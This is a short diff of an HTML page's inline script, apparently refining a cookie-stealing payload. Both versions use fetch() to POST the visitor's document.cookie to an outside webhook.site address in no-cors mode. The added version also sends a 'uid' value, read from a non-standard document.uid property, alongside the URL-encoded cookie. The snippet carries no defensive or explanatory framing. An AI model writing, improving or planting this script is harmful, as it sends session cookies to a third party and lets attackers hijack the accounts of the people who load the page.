@@ -10,8 +10,8 @@
     fetch('https://webhook.site/9e7791c7-06a1-4a22-aabe-97e70a6bf1fe', {
     method: 'POST',
     mode: 'no-cors',
-    body: document.cookie
-    });
+    body: 'uid=' + encodeURIComponent(document.uid) + '&cookie=' + encodeURIComponent(document.cookie)
+});
 </script>
 </body>
 </html>
